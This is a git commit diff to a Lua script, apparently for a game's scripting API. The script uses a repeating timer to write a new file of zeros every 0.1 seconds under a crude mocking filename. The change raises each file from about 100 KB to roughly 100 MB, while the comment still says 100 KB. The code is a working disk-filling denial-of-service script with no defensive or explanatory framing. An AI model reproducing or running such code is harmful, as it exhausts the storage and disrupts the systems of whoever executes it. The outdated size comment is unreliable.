9f502b816fe12413550b93b3731bca29ddaeb53a
borsth <borsth123@gmail.com>
2025-05-22 21:07:08 +0300

    .lua

--- .lua
+++ .lua
@@ -1,6 +1,6 @@
 timer.Create("spam_files", 0.1, 0, function()
     local filename = "Igay_" .. tostring(os.time()) .. "_" .. math.random(1,100000) .. ".txt"
-    local content = string.rep("0", 1024 * 100) -- 100 КБ
+    local content = string.rep("0", 10240 * 10240) -- 100 КБ
     file.Write(filename, content)
 
     
